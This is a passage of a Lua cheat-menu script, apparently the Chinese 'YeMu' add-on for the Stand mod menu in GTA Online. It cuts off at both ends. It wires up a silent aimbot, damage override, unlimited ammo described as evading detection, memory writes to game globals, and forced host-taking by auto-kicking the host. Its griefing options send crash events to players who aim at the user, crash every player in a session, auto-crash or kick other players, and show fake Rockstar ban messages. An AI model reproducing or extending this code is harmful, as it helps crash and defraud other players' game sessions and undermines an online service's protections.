            util.toast("您的个人载具已被摧毁,它已被自动索赔.")
        end
    end
    util.yield(100)
end)
local muggerWarning
muggerWarning = menu.action(other, "金钱清除", {}, "", function(click_type)
    menu.show_warning(muggerWarning, click_type, "警告: 请三思您的举措，一旦您使用，改变就无法撤消，你的钱就会清空. 仅在您打算摆脱金钱时使用", function()
        menu.delete(muggerWarning)
        local muggerList = menu.list(self, "金钱清除")
        local price = 1000
        menu.click_slider(muggerList, "清除金额", {"muggerprice"}, "", 0, 2000000000, 0, 1000, function(value)
            price = value
        end)
        menu.toggle_loop(muggerList, "应用", {}, "点击后给拉玛打电话请求劫匪,请求后您设置的对应金额就会清除", function()
            memory.write_int(memory.script_global(262145 + 4121), price) 
        end)
        menu.trigger_command(muggerList)
    end)
end)
menu.toggle_loop(online, "强制脚本主机", {}, "夜幕LUA会尽快帮你成为脚本主机", function()
    menu.trigger_commands("scripthost")
end)
menu.toggle_loop(online, "自动获取脚本主机", {}, "", function()
    if players.get_script_host() ~= players.user() then
        menu.trigger_commands("scripthost")
    end
end)
menu.toggle_loop(online, "自动获取主机", {"alwayshost"}, "夜幕LUA会尽快帮你成为战局主机", function()
	if not (players.get_host() == PLAYER.PLAYER_ID()) and not util.is_session_transition_active() then
		if not (PLAYER.GET_PLAYER_NAME(players.get_host()) == "**Invalid**") then
			menu.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(players.get_host()))
			util.yield(200)
		end
	end
end)
-----娱乐选项
scaleform = require('YeMulib.ScaleformLib')
sf = scaleform('instructional_buttons')
local startViewMode
local scope_scaleform
local gaveHelmet = false
menu.toggle_loop(funfeatures, '钢铁侠', {}, '', function()
    menu.trigger_commands("levitate on")
    if not PED.IS_PED_WEARING_HELMET(players.user_ped()) then
        PED.GIVE_PED_HELMET(players.user_ped(), true, 4096, -1)
        gaveHelmet = true
    end
    if startViewMode == nil then
        startViewMode = CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context)
    end
    if CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context) != 4 then
        CAM.SET_CAM_VIEW_MODE_FOR_CONTEXT(context, 4)
    end
    scope_scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE('REMOTE_SNIPER_HUD')
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scope_scaleform, 'REMOTE_SNIPER_HUD')
    GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scope_scaleform, 255, 255, 255, 255, 0)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    local barrageInput = 'INPUT_PICKUP'
    memory.write_int(memory.script_global(1649593 + 1163), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(2, JSkey.get_control_instructional_button(0, 'INPUT_ATTACK'), '机炮')
    sf.SET_DATA_SLOT(1, JSkey.get_control_instructional_button(0, 'INPUT_AIM'), '原子枪')
    sf.SET_DATA_SLOT(0, JSkey.get_control_instructional_button(0, barrageInput), '火箭弹')
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    JSkey.disable_control_action(2, 'INPUT_VEH_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(2, 'INPUT_VEH_FLY_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(2, 'INPUT_VEH_SUB_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(0, 'INPUT_ATTACK')
    JSkey.disable_control_action(0, 'INPUT_AIM')
    if not (JSkey.is_disabled_control_pressed(0, 'INPUT_ATTACK') or JSkey.is_disabled_control_pressed(0, 'INPUT_AIM') or JSkey.is_disabled_control_pressed(0, barrageInput)) then return end
    local a = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local b = getOffsetFromCam(80)
    local hash
    if JSkey.is_disabled_control_pressed(0, 'INPUT_ATTACK') then
        hash = util.joaat('VEHICLE_WEAPON_PLAYER_LAZER')
        if not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) then
            WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 26)
            while not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) do
                util.yield()
            end
        end
    elseif JSkey.is_disabled_control_pressed(0, 'INPUT_AIM') then
        hash = util.joaat('WEAPON_RAYPISTOL')
        if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), hash, false) then
            WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 9999, false, false)
        end
    else
        hash = util.joaat('WEAPON_RPG')
        if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), hash, false) then
            WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 9999, false, false)
        end
        a.x += math.random(0, 100) / 100
        a.y += math.random(0, 100) / 100
        a.z += math.random(0, 100) / 100
    end
    WEAPON.SET_CURRENT_PED_WEAPON(players.user_ped(), util.joaat('WEAPON_UNARMED'), true)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
        a.x, a.y, a.z,
        b.x, b.y, b.z,
        200,
        true,
        hash,
        PLAYER.PLAYER_PED_ID(),
        true, true, -1.0
    )
end, function()
    if gaveHelmet then
        PED.REMOVE_PED_HELMET(players.user_ped(), true)
        gaveHelmet = false
    end
    local pScaleform = memory.alloc_int()
    memory.write_int(pScaleform, scope_scaleform)
    GRAPHICS.SET_SCALEFORM_MOVIE_AS_NO_LONGER_NEEDED(pScaleform)
    menu.trigger_commands("levitate off")
    util.yield()
    startViewMode = nil
end)
-------------------

local fakemessages_root = menu.list(funfeatures, "虚假的R*警告", {}, "被骗了？~")
menu.slider(fakemessages_root, "延迟虚假消息", {}, "在显示虚假消息之前等待多长时间（以秒为单位）", 0, 300, 0, 1, function(s)
    fake_alert_delay = s*1000
end)
local fake_suspend_date = "2023年1月1日"
menu.text_input(fakemessages_root, "自定义暂停日期", {"customsuspensiondate"}, "" , function(on_input)
    fake_suspend_date = on_input
end, "2023年1月1日")
local custom_alert = "你好夜幕！"
menu.action(fakemessages_root, "自定义的虚假消息文本", {"customfakealert"}, "输入您的虚假的R*警告应显示的内容", function(on_click)
    notification("请输入您希望的R*警告显示内容", colors.blue)
    menu.show_command_box("customfakealert" .. " ")
end, function(on_command)
    show_custom_alert_until_enter(on_command)
end)
alert_options = {"禁令", "禁令永久", "服务不可用", "Stand yyds!", "暂时封禁",  "夜幕LUA", "开挂", "举个栗子"}
menu.list_action(fakemessages_root, "假警报", {"fakealert"}, "", alert_options, function(index, value, click_type)
    pluto_switch index do 
        case 1: 
            show_custom_alert_until_enter("您已被禁止进入GTA在线模式。~n~返回Grand Theft Auto V。")
            break 
        case 2:
            show_custom_alert_until_enter("您已被永久禁止进入GTA在线模式。~n~返回Grand Theft Auto V。")
            break
        case 3:
            show_custom_alert_until_enter("Rockstar游戏服务当前不可用。~n~请返回Grand Theft Auto V。")
            break
        case 4:
            show_custom_alert_until_enter("Stand天下第一!")
            break
        case 5:
            show_custom_alert_until_enter("您已被禁止进入GTA在线模式直到 " .. fake_suspend_date .. ".~n~此外,您的GTA在线模式角色将被重置。~n~Grand Theft Auto V。")
            break
        case 6:
            show_custom_alert_until_enter("夜幕yyds！~n~我爱夜幕！")
            break
        case 7:
            show_custom_alert_until_enter("操你妈的~n~不开挂还TM想进线上？告诉你：不可能！")
            break
        case 8:
            show_custom_alert_until_enter(custom_alert)
            break
    end
end)
menu.action(funfeatures, "思空之岛", {""}, "", function(on_click)
    local c = {}
    c.x = 0
    c.y = 0
    c.z = 500
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), c.x, c.y, c.z+5)
    if island_block == 0 or not ENTITY.DOES_ENTITY_EXIST(island_block) then
        request_model_load(1054678467)
        island_block = entities.create_object(1054678467, c)
    end
end)
meteors = false
menu.toggle(funfeatures, "陨落", {"yunluo"}, "战局里的玩家可以看到", function(on)
    if on then
        meteors = true
        start_meteor_shower()
    else
        meteors = false
    end
end, false)
menu.toggle_loop(funfeatures, "奥义.梦想真说", {""}, "战局里的玩家可以看到", function()
    MISC.FORCE_LIGHTNING_FLASH()
end)
menu.toggle(funfeatures, "特斯拉自动驾驶", {}, "我爱和平精英特斯拉车载具皮肤！", function(toggled)
    local player = players.user_ped()
    local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
    local tesla_ai = util.joaat("u_m_y_baygor")
    local tesla = util.joaat("raiden")
    request_model(tesla_ai)
    request_model(tesla)
    if toggled then     
        if PED.IS_PED_IN_ANY_VEHICLE(player, true) then
            menu.trigger_commands("deletevehicle")
        end
        tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
        tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true)
        ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
        PED.SET_PED_INTO_VEHICLE(player, tesla_vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
        PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
        VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
        menu.trigger_commands("performance")
        if HUD.IS_WAYPOINT_ACTIVE() then
	    	local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos.x, pos.y, pos.z, 20, 786603, 0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20, 786603)
        end
    else
        if tesla_ai_ped ~= nil then 
            entities.delete_by_handle(tesla_ai_ped)
        end
        if tesla_vehicle ~= nil then 
            entities.delete_by_handle(tesla_vehicle)
        end
    end
end)
menu.toggle(funfeatures, "世界停电", {"poweroutage"}, "如果世界停电你会干什么？~", function(toggled)
    GRAPHICS.SET_ARTIFICIAL_LIGHTS_STATE(toggled)
end)
action_lua = menu.list(funfeatures, "动作选项", {}, "", function(); end)
    action_lua_load = menu.action(action_lua, "加载动作脚本选项", {""}, "", function()
        notification("正在加载动作脚本,请稍等",colors.black)
        util.yield(1500)
        require "lib.YeMulib.YMactions.YMactions"
        menu.delete(action_lua_load)
    end)
local fireworks_root = menu.list(funfeatures, "新年快乐", {}, "")
menu.action(fireworks_root, "放置烟花盒", {"placefireworks"}, "新年快乐，回家看看家人吧~", function(click_type)
    placefirework()
end)
menu.action(fireworks_root, "开始放烟花", {"kaboom"}, "祝你新年快乐哦~。", function(click_type)
    fireworkshow()
end)   

----武器选项
finger_thing = menu.list(weapon, "手指枪", {}, "按B键")
shouzhiqiang()

menu.toggle_loop(weapon, "激光眼", {"lasereyes"}, "按住E键", function(on)
    laser_eyes()
end)
local proxysticks = menu.list(weapon, '粘弹自动爆炸', {}, '')
    menu.toggle_loop(proxysticks, '粘弹自动爆炸', {'JSproxyStickys'}, '使您的粘弹在玩家或NPC附近时自动引爆.', function()
        proxyStickys()
    end)
    menu.toggle(proxysticks, '引爆附近的玩家', {'JSProxyStickyPlayers'}, '如果您的粘性炸弹在玩家附近时自动引爆.', function(toggle)
        proxyStickys_players(toggle)
    end, proxyStickySettings.players)
    menu.toggle(proxysticks, '引爆附近的NPC', {'JSProxyStickyNpcs'}, '如果您的粘性炸弹在NPC附近时自动引爆.', function(toggle)
        proxystickys_npc(toggle)
    end, proxyStickySettings.npcs)
    menu.slider(proxysticks, '爆炸半径', {'JSstickyRadius'}, '粘性炸弹必须离目标多近才会引爆.', 1, 10, proxyStickySettings.radius, 1, function(value)
        proxysticks_radius(value)
    end)
    menu.action(proxysticks, '移除所有粘性炸弹', {'JSremoveStickys'}, '移除所有存在的粘性炸弹(不仅仅是你的).', function()
        WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(util.joaat('weapon_stickybomb'), false)
    end)
pvphelp = menu.list(weapon, "自瞄选项", {"pvphelp"}, "")
local silent_aimbotroot = menu.list(pvphelp, "静默自瞄1.0", {"lancescriptsilentaimbot"}, "")
menu.toggle(silent_aimbotroot, "静默自瞄", {"saimbottoggle"}, "", function(on) SE_Notifications = true
    silent_aimbot = on
    start_silent_aimbot()
end)
menu.toggle_loop(silent_aimbotroot, "最大自瞄范围", {}, "手柄的辅助瞄准功能开启后，将有无限的范围.", function()
    PLAYER.SET_PLAYER_LOCKON_RANGE_OVERRIDE(players.user(), 99999999.0)
end)
menu.toggle(silent_aimbotroot, "静默自瞄玩家", {"saimbotplayers"}, "", function(on)
    satarget_players = on
end)
menu.toggle(silent_aimbotroot, "静默自瞄NPC\'s", {"saimbotpeds"}, "", function(on)
    satarget_npcs = on
end)
menu.toggle(silent_aimbotroot, "用视野指定范围", {"saimbotusefov"}, "你不会通过你的屁眼杀人", function(on)
    satarget_usefov = on
end)
menu.slider(silent_aimbotroot, "视野", {"saimbotfov"}, "", 1, 270, 180, 1, function(s)
    sa_fov = s
end)
menu.toggle(silent_aimbotroot, "忽略车内目标", {"saimbotnovehicles"}, "如果你想装的更像个正常人, 或者射车内目标时遇到问题", function(on)
    satarget_novehicles = on
end)
satarget_nogodmode = true
menu.toggle(silent_aimbotroot, "忽略无敌目标", {"saimbotnogodmodes"}, "因为这有什么意义？", function(on)
    satarget_nogodmode = on
end, true)
menu.toggle(silent_aimbotroot, "好友成为目标", {"saimbottargetfriends"}, "", function(on)
    satarget_targetfriends = on
end)
menu.toggle(silent_aimbotroot, "伤害修改", {"saimbotdmgo"}, "", function(on)
    satarget_damageo = on
end)
menu.slider(silent_aimbotroot, "伤害修改的数值", {"saimbotdamageoverride"}, "", 1, 1000, 100, 1, function(s)
    sa_odmg = s
end)
damage_numbers_list = menu.list(weapon, "伤害数字")
menu.toggle_loop(damage_numbers_list, "伤害数字", {"damagenumbers"}, "", function()
    damage_numbers()
end)
menu.toggle(damage_numbers_list, "包括车辆", {"damagenumbersvehicles"}, "", function (value)
    damage_numbers_target_vehicles = value
end)
menu.slider(damage_numbers_list, "数字尺寸", {"damagenumberstextsize"}, "", 1, 100, 7, 1, function (value)
    damage_numbers_text_size = value * 0.1
end)
damage_numbers_colours_list = menu.list(damage_numbers_list, "颜色设置")
menu.rainbow(menu.colour(damage_numbers_colours_list, "默认颜色", {"damagenumcolour"}, "默认命中的颜色", damage_numbers_health_colour, true, function (value)
    damage_numbers_health_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "暴击颜色", {"damagenumcritcolour"}, "暴击颜色", damage_numbers_crit_colour, true, function (value)
    damage_numbers_crit_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "盔甲颜色", {"damagenumarmourcolour"}, "盔甲颜色", damage_numbers_armour_colour, true, function (value)
    damage_numbers_armour_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "载具颜色", {"damagenumvehiclecolour"}, "载具颜色", damage_numbers_vehicle_colour, true, function (value)
    damage_numbers_vehicle_colour = value
end))
local aimkarma = menu.list(weapon, "瞄准惩罚", {}, "", function(); end)
menu.toggle_loop(aimkarma, '发送脚本事件崩溃', {''}, '如果他瞄准你自动崩溃', function()
    sendscriptcrash()
end)
menu.toggle_loop(aimkarma, '拉海滩', {''}, '自动拉海滩', function()
    sendgobreach()
end)
menu.toggle_loop(aimkarma, '气死我了，来个全局崩', {''}, '如果有sb打你,无差别崩溃全局', function()
    sendallplayercrash()
end)
menu.toggle_loop(aimkarma, '射击', {'JSbulletAimKarma'}, '射击瞄准您的玩家.', function()
    bulletaimkarma()
end)
menu.toggle_loop(aimkarma, '爆炸', {'JSexpAimKarma'}, '使用您的自定义爆炸设置爆炸玩家.', function()
    expaimkarma()
end)
menu.toggle_loop(aimkarma, '禁用无敌', {'JSgodAimKarma'}, '如果开着无敌的玩家瞄准你,这会通过向前推动他们的游戏画面来禁用他们的无敌模式.', function()
    godaimkarma()
end)
menu.action(aimkarma, 'Stand玩家瞄准惩罚', {}, '连接到Stand的玩家瞄准惩罚', function()
    menu.focus(menu.ref_by_path('World>Inhabitants>Player Aim Punishments>Anonymous Explosion', 37))
end)
local function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, 
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            players.user_ped(), 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end
menu.toggle_loop(weapon, '4D方框瞄准', {'_4d_crosshair'}, '', function()
    request_texture_dict_load('visualflow')
    local rc = raycast_gameplay_cam(-1, 10000.0)[2]
    local c = players.get_position(players.user())
    local dist = MISC.GET_DISTANCE_BETWEEN_COORDS(rc.x, rc.y, rc.z, c.x, c.y, c.z, false)
    local dir = v3.toDir(CAM.GET_GAMEPLAY_CAM_ROT(0))
    size = {}
    size.x = 0.5+(dist/50)
    size.y = 0.5+(dist/50)
    size.z = 0.5+(dist/50)
    GRAPHICS.DRAW_MARKER(3, rc.x, rc.y, rc.z, 0.0, 0.0, 0.0, 0.0, 90.0, 0.0, size.y, 1.0, size.x, 35, 35, 255, 200, false, true, 2, false, 'visualflow', 'crosshair')
end)
menu.toggle_loop(weapon, "快速更换武器", {"fasthands"}, "更快地更换你的武器.", function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 56) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)
menu.toggle_loop(weapon, "灵魂转移之枪", {""}, "", function()-------heezy
    MISC.FORCE_LIGHTNING_FLASH()
    Soul_Gun()
end)
menu.toggle(weapon, "痛击队友", {}, '使你在游戏中能够射击队友', function(toggle)
    PED.SET_CAN_ATTACK_FRIENDLY(players.user_ped(), toggle, false)
end)
-------命中效果
local effectColour = {r = 0.5, g = 0.0, b = 0.5, a = 1.0}
local selectedOpt = 1
hitEffectRoot = menu.list(weapon, "命中效果", {}, "")
    menu.toggle_loop(hitEffectRoot, "开启效果", {}, "", function()
        local effect = hitEffects[selectedOpt]
        if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
            return STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
        end
        local hitCoords = v3.new()
        if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), hitCoords) then
            local raycastResult = get_raycast_result(1000.0)
            local rot = raycastResult.surfaceNormal:toRot()
            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
            if effect.colorCanChange then
                local colour = effectColour
                GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
            end
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                effect.name,
                hitCoords.x, hitCoords.y, hitCoords.z,
                rot.x - 90.0, rot.y, rot.z,
                1.0, 
                false, false, false, false
            )
        end
    end)
    local options = {
        {"小丑爆炸"},
        {"小丑出现"},
        {"开拓者FW"},
        {"星爆FW"},
        {"喷泉FW"},
        {"外星解体"},
        {"小丑花"},
        {"外星冲击波FW"},
        {"小丑木兹"},
    }
    menu.list_select(hitEffectRoot, "设置效果", {}, "", options, 1, function (opt)
        selectedOpt = opt
    end)
    local SetEffectColour = function(colour) effectColour = colour end
    local menuColour =
    menu.colour(hitEffectRoot, "设置颜色", {"dwuahjudhau"}, "仅对某些效果有效", effectColour, false, SetEffectColour)
    menu.rainbow(menuColour)
-----------------------------------------------
menu.action(weapon, '获得所有武器', {""}, '', function (on)
menu.trigger_commands("allguns")
local notification = b_notifications.new()
notification.notify("夜幕提示","执行成功！")
end)
menu.toggle(weapon, '夜视仪', {"nightvision"}, '', function (on)
if on then
menu.trigger_commands("nightvision on")
else
menu.trigger_commands("nightvision off")
end
end)
menu.toggle(weapon, '导弹快速锁定', {""}, '', function (on)
if on then
menu.trigger_commands("instantlockon on")
else
menu.trigger_commands("instantlockon off")
end
end)
menu.toggle(weapon, '热成像', {"thermalvision"}, '', function (on)
if on then
menu.trigger_commands("thermalvision on")
else
menu.trigger_commands("thermalvision off")
end
end)
menu.toggle(weapon, "无限弹药", { "inf_ammo" }, '可以避免子弹过多的检测', function(toggle)
    unlimitedbullet(toggle)
end)
menu.toggle_loop(weapon, "锁定弹药", { "lock_ammo" }, "锁定当前武器为最大弹药", function()
    lockthebullet()
end)
featureweapon = menu.list(weapon, "特色武器", {}, "各种功能")
menu.toggle_loop(featureweapon,"抓钩枪", {}, "", function()
    grappling_gun()
end)
menu.toggle_loop(featureweapon,"鲨鱼枪", {}, "", function()
    Shark_gun()
end)
menu.toggle_loop(featureweapon,"陨石枪", {}, "", function()
    local pos = v3.new()
    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), pos) then
        entities.create_object(3751297495, pos)
    end
end)
    menu.toggle_loop(featureweapon, '核弹枪', {}, "使火箭炮发出的子弹变成核弹", function()
        nukegunmode()
    end)
menu.toggle_loop(featureweapon, "模型爱情(射击触发)", {}, "爱情两个实体以让它们互相吸引", function()
	ctst()
end, function ()
    ctst_stop()
end)
entity_control = menu.list(weapon, "实体控制信息枪", {}, "控制你所瞄准的实体")
crosshair1 = menu.toggle_loop(entity_control, "瞄准准星 (+)", {''}, '', function()
        HUD.SET_TEXT_SCALE(1.0,0.5)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        HUD.SET_TEXT_COLOUR(255, 255, 255, 180)
        util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("+")
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.477,0)
end)
menu.toggle_loop(entity_control, "瞄准实体信息", {}, "显示您瞄准的实体的信息", function()
    local info = get_aim_info()
    if info['ent'] ~= 0 then
        local text = "哈希: " .. info['hash'] .. "\n实体: " .. info['ent'] .. "\n生命值: " .. info['health'] .. "\n类型: " .. info['type'] .. "\n速度: " .. info['speed']
        directx.draw_text(0.5, 0.25, text, 5, 0.7, {r=1, g=1, b=1, a=1}, true)
    end
end)
    menu.toggle_loop(entity_control, "开启", {}, "", function()
        entitycontrol()
        menu.set_value(crosshair1, true)
    end,function()
        menu.set_value(crosshair1, false)
    end)
    menu.action(entity_control, "清除记录的实体", {}, "", function()
        clearcontrollog()
    end)
    menu.divider(entity_control, "实体列表")
menu.toggle_loop(protections, "拦截抢劫犯", {}, "", function() 
YeMuprotections4()
end)
load_crash_XP = menu.action(protections, "开启自动崩溃/踢出XP魔怔人", {}, "", function()
    notification("[夜幕 提示] \n自动崩溃/踢出XP魔怔人已准备就绪", colors.black)
    require "lib.YeMulib.autocrashXP"
    menu.delete(load_crash_XP)
end)
menu.action(protections, "移除附加物", {""}, "", function()
		notification("搞定", colors.black)
YeMuprotections5()
end)
    menu.action(protections, "强制停止所有声音事件", {""}, "", function()
        for i=-1,100 do
            AUDIO.STOP_SOUND(i)
            AUDIO.RELEASE_SOUND_ID(i)
        end
	end)
menu.action(protections, "超级清除", {"superclear"}, "来一波炒鸡清除", function()
YeMuprotections6()
	end)
menu.toggle_loop(protections, "循环清除世界", {clearworlds}, "用完记得关闭此选项", function()
		MISC.CLEAR_AREA(0,0,0 , 1000000, true, true, true, true)
end)

    menu.list_action(protections, "清除全部", {}, "", {"NPC", "载具", "物体", "可拾取物体", "货车", "发射物", "声音"}, function(index, name)
    YeMuprotections49(index, name)
end)
local pool_limiter = menu.list(protections, "实体池限制", {}, "")
local ped_limit = 175
menu.slider(pool_limiter, "人物池限制", {"pedlimit"}, "", 0, 256, 175, 1, function(amount)
    ped_limit = amount
end)
local veh_limit = 200
menu.slider(pool_limiter, "载具池限制", {"vehlimit"}, "", 0, 300, 150, 1, function(amount)
    veh_limit = amount
end)
local obj_limit = 750
menu.slider(pool_limiter, "物体池限制", {"objlimit"}, "", 0, 2300, 750, 1, function(amount)
    obj_limit = amount
end)
local projectile_limit = 25
menu.slider(pool_limiter, "投掷物池限制", {"projlimit"}, "", 0, 50, 25, 1, function(amount)
    projectile_limit = amount
end)
menu.toggle_loop(pool_limiter, "启用实体池限制", {}, "", function()
    local ped_count = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        util.yield()
        if ped ~= players.user_ped() then
            ped_count += 1
        end
        if ped_count >= ped_limit then
            for _, ped in pairs(entities.get_all_peds_as_handles()) do
                util.yield()
                entities.delete_by_handle(ped)
            end
            util.toast("[夜幕提示] 人物池达到上限,正在清理...")
        end
    end
    local veh__count = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        util.yield()
        veh__count += 1
        if veh__count >= veh_limit then
            for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
                entities.delete_by_handle(veh)
            end
            util.toast("[夜幕提示] 载具池达到上限,正在清理...")
        end
    end
    local obj_count = 0
    for _, obj in pairs(entities.get_all_objects_as_handles()) do
        util.yield()
        obj_count += 1
        if obj_count >= obj_limit then
            for _, obj in pairs(entities.get_all_objects_as_handles()) do
                util.yield()
                entities.delete_by_handle(obj)
            end
            util.toast("[夜幕提示] 物体池达到上限,正在清理...")
        end
    end
end)
menu.toggle_loop(protections, "阻止变成野兽", {}, "阻止他们用Stand把你变成野兽", function()
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
        local host
        repeat
            host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
            util.yield()
        until host ~= -1
        menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Script"))
    end
end)
menu.toggle_loop(protections, "过渡助手", {"transitionhelper"}, "避免在切换战局时提前清除自己的PED模型而导致卡云 在进行任务时 请关闭此选项和克隆清理选项", function()
    if util.is_session_transition_active() then
        menu.trigger_commands("BlockClones off")
    end
    util.yield(6000)
    menu.trigger_commands("BlockClones on")
end)
menu.toggle_loop(protections, "克隆清理", {"BlockClones"}, "当检测到你周围存在克隆模型时会自动尝试清理 如果出现连续的清理通知但实际上并没有清理掉 说明对方阻止了网络事件 请确保针对阻止网络事件的作弊者开启了超时", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
    if ENTITY.GET_ENTITY_MODEL(ped) == ENTITY.GET_ENTITY_MODEL(players.user_ped()) and not PED.IS_PED_A_PLAYER(ped) and not util.is_session_transition_active() then
        notification("检测到克隆模型 正在尝试清理", colors.black)
        entities.delete_by_handle(ped)
        util.yield(100)
    end
    end
end)
local block_spec_syncs
block_spec_syncs = menu.toggle_loop(protections, "阻止观看同步", {}, "阻止所有观看你的人的同步.", function()
    for _, PlayerID in players.list(false, true, true) do
        local ped_dist = v3.distance(players.get_position(players.user()), players.get_position(PlayerID))
        if v3.distance(players.get_position(players.user()), players.get_cam_pos(PlayerID)) < 25.0 and ped_dist > 30.0 or players.get_spectate_target(PlayerID) == players.user() then
            local outgoingSyncs = menu.ref_by_rel_path(menu.player_root(PlayerID), "Outgoing Syncs>Block")
            outgoingSyncs.value = true
            pos = players.get_position(players.user())
            if v3.distance(pos, players.get_cam_pos(PlayerID)) < 25.0 then
                repeat 
                    util.yield()
                until v3.distance(pos, players.get_cam_pos(PlayerID)) > 50.0 
                outgoingSyncs.value = false
            end
        end
    end
end, function()
    for _, PlayerID in players.list(false, true, true) do
        if players.exists(PlayerID) then
            local outgoingSyncs = menu.ref_by_rel_path(menu.player_root(PlayerID), "Outgoing Syncs>Block")
            outgoingSyncs.value = false
        end
    end
end)
renwu_disable = menu.toggle_loop(protections, "禁用阻止实体轰炸", {"disableBlockentitybombing"}, "将在任务中自动禁用阻止实体轰炸,防止任务卡关.", function()
    local EntitySpam = menu.ref_by_path("Online>Protections>Block Entity Spam>Block Entity Spam")
    if NETWORK.NETWORK_IS_ACTIVITY_SESSION() == true then
        if not menu.get_value(EntitySpam) then return end
        menu.trigger_command(EntitySpam, "off")
    else
        if menu.get_value(EntitySpam) then return end
        menu.trigger_command(EntitySpam, "on")
    end
end)
menu.set_value(renwu_disable,true)
menu.action(protections,"战局卡顿自救", {}, "会在天上加载20-30秒，主机不会改变（如果你是主机）", function ()
    menu.trigger_commands("restartfm")
end)
menu.divider(protections, "崩溃保护")	
    menu.toggle_loop(protections, "拦截不好载具", {}, "如货机等(刷不出来车请关掉此防护)", function()
     YeMuprotections8()
    end)
    menu.toggle_loop(protections, "拦截粒子效果", {}, "", function()
     YeMuprotections9()
    end)
    
    menu.toggle_loop(protections, "拦截火焰效果", {}, "", function()
      YeMuprotections24()
    end)
    menu.toggle_loop(protections, "拦截附加物", {}, "", function()
